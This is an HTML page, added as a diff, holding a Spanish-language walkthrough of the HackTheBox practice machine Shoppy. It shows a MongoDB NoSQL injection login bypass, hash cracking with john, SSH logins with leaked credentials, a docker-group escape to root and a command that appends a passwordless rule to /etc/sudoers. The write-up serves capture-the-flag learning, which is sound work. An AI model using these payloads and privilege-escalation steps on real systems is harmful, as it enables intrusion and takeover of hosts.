@@ -1,0 +1,254 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Shoppy HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/shoppy.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Shoppy HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Shoppy de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Shoppy de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Shoppy HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Shoppy HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Shoppy de la plataforma de HackTheBox","headline":"Writeup Faculty HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Shoppy HackTheBox</h1>
+          <p>Resolución de la máquina Shoppy de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.10.11.180
+Nmap scan report for 10.10.11.180
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http</span>
+</code></pre></div></div>
+
+<div><p>Al hacer un simple curl y mirar las cabeceras podemos ver el dominio shoppy.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="p">-s 10.10.11.180 -I | </span><span class="s2">grep</span><span class="p"> Location
+Location: </span><span class="kd">http://shoppy.htb</span>
+</code></pre></div></div>
+
+<div><p>Haciendo un poco de fuzzing podemos ver un /admin que nos redirige a /login</p></div>	
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster </span><span class="p">dir -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 -u shoppy.htb
+===============================================================
+[+] Url:                     http://shoppy.htb
+[+] Threads:                 100
+[+] Wordlist:     /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="kd">/admin</span><span class="p">                (Status: 302) [Size: 28] [--> </span><span class="kd">/login</span><span class="p">]
+</span><span class="kd">/login</span><span class="p">                (Status: 200) [Size: 1074]
+/exports              (Status: 301) [Size: 181] [--> /exports/]</span>
+</code></pre></div></div>
+
+<div><p>Mirándolo desde la web podemos ver un panel de autenticación</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Podemos bypassearlo con una inyección nosql de mongodb de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#mongodb-payloads">payloadsallthethings</a> admin'||'1==1</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Al entrar al panel podemos ver un buscador de usuarios</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Podemos probar en el buscador usar el mismo payload del login admin'||'1==1</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Al usar el payload nos da una opción de exportar el resultado</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>En el resultado podemos ver un par de usuarios, y hashes</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">[
+  {
+    </span><span class="na">"_id"</span><span class="p">:</span><span class="s2"> "62db0e93d6d6a999a66ee67a"</span><span class="p">,
+    </span><span class="na">"username"</span><span class="p">:</span><span class="s2"> "admin"</span><span class="p">,
+    </span><span class="na">"password"</span><span class="p">:</span><span class="s2"> "23c6877d9e2b564ef8b32c3a23de27b2"</span><span class="p">
+  },
+  {
+    </span><span class="na">"_id"</span><span class="p">: </span><span class="s2">"62db0e93d6d6a999a66ee67b"</span><span class="p">,
+    </span><span class="na">"username"</span><span class="p">: </span><span class="s2">"josh"</span><span class="p"></span><span class="p">,
+    </span><span class="na">"password"</span><span class="p">: </span><span class="s2">"6ebcea65320589ca4f2f1ce039975995"</span><span class="p">
+  }
+]</span>
+</code></pre></div></div>
+
+<div><p>Al usar john para decifrar los hashes podemos romper uno y ver una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat </span><span class="p">hashes
+admin:23c6877d9e2b564ef8b32c3a23de27b2
+josh:6ebcea65320589ca4f2f1ce039975995
+
+</span><span class="s2">❯ john</span><span class="p"> -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes --format=Raw-MD5
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 XOP 4x2])
+</span><span class="kd">remembermethisway</span><span class="p"> (</span><span class="na">josh</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Fuzzeando subdominios podemos encontrar que existe mattermost.shoppy.htb</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u shoppy.htb
+===============================================================
+[+] Url:          http://shoppy.htb
+[+] Threads:      100
+[+] Wordlist:     /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: </span><span class="kd">mattermost.shoppy.htb</span><span class="p"> (Status: 200) [Size: 3122]</span>
+</code></pre></div></div>
+
+<div><p>Al darle un vistazo podemos ver otro login, para el cual podemos usar las credenciales</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Podemos ver una conversación, la cual bueno... nos regala credenciales por ssh</p></div>
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Simplemente nos conectamos y podemos leer la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">jaeger@10.10.11.180
+jaeger@10.10.11.180's password: </span><span class="kd">Sh0ppyBest@pp!
+</span><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
+</span><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.180 172.17.0.1 dead:beef::250:56ff:feb9:703f
+</span><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+6ae**************************83c
+</span><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando privilegios de sudoers, podemos ejecutar un binario como el usuario deploy</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+[sudo] password for jaeger: </span><span class="kd">Sh0ppyBest@pp!</span><span class="p">
+Matching Defaults entries for jaeger on shoppy:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jaeger may run the following commands on shoppy:
+    (</span><span class="na">deploy</span><span class="p">) </span><span class="kd">/home/deploy/password-manager</span><span class="p">
+</span><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>           
+</code></pre></div></div>
+
+<div><p>Al ejecutarlo nos pide una contraseña, asi que no tenemos acceso</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: </span><span class="kd">test</span><span class="p">
+Access denied! This incident will be reported !
+</span><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si le hacemos un cat al archivo podemos ver una parte que al darle forma se ve asi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">/home/deploy</span><span class="p">$ cat password-manager
+&lt..............................................>
+Welcome to Josh password manager!
+Please enter your master password: </span><span class="kd">Sample</span><span class="p">
+Access granted! Here is creds !
+cat /home/deploy/creds.txt
+Access denied!
+This incident will be reported !
+&lt..............................................></span>
+</code></pre></div></div>
+
+<div><p>Ejecutando el archivo y pasandole la contraseña lekeada encontramos credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -u deploy /home/deploy/password-manager
+Welcome to Josh password manager!
+Please enter your master password: </span><span class="kd">Sample</span><span class="p">
+Access granted! Here is creds !
+Deploy Creds :
+username: </span><span class="kd">deploy</span><span class="p">
+password: </span><span class="kd">Deploying@pp!</span><span class="p">
+</span><span class="s2">jaeger@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Nos podemos conectar por ssh como deploy con las credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sshpass </span><span class="p">-p </span><span class="no">'Deploying@pp!'</span><span class="p"> ssh deploy@10.10.11.180
+$ bash
+</span><span class="s2">deploy@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+</span><span class="s2">deploy@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.180 172.17.0.1 dead:beef::250:56ff:feb9:703f
+</span><span class="s2">deploy@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al hacer id podemos ver que esta en el grupo docker</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2"></span><span class="s2">deploy@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(</span><span class="kd">docker</span><span class="p">)
+</span><span class="s2">deploy@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando <a href="https://gtfobins.github.io/gtfobins/docker/#shell">gtfobins</a> podemos ver que hay una manera de conseguir shell de root</p></div>
+<div><p>Corriendo un contenedor y montando la raiz, podemos ser root en el y leer la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">deploy@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
+</span><span class="s2">root@ff6ce41bd41e</span><span class="p">:</span><span class="na">/</span><span class="p"># whoami
+root
+</span><span class="s2">root@ff6ce41bd41e</span><span class="p">:</span><span class="na">/</span><span class="p"># cat /root/root.txt
+b2d**************************787
+</span><span class="s2">root@ff6ce41bd41e</span><span class="p">:</span><span class="na">/</span><span class="p">#</span>
+</code></pre></div></div>
+
+<div><p>Aunque somos root, seguimos en un contenedor con una montura, podemos modificar los sudoers y ver los cambios de la montura reflejados en la máquina real</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">root@ff6ce41bd41e</span><span class="p">:</span><span class="na">/</span><span class="p"># echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
+</span><span class="s2">root@410fb3ebe8eb</span><span class="p">:</span><span class="na">/</span><span class="p"># exit
+</span><span class="s2">deploy@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+Matching Defaults entries for deploy on shoppy:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User deploy may run the following commands on shoppy:
+    (</span><span class="kd">ALL</span><span class="p">) NOPASSWD: </span><span class="kd">ALL</span><span class="p">
+</span><span class="s2">deploy@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora tenemos privilegio máximo en sudoers, hacemos sudo su y somos root</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">deploy@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo su
+</span><span class="s2">root@shoppy</span><span class="p">:</span><span class="na">~</span><span class=""># id
+uid=0(root) gid=0(root) groups=0(root)
+</span><span class="s2">root@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p"># hostname -I
+10.10.11.180 172.17.0.1 dead:beef::250:56ff:feb9:703f
+</span><span class="s2">root@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p"># cat root.txt
+b2d**************************787
+</span><span class="s2">root@shoppy</span><span class="p">:</span><span class="na">~</span><span class="p">#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
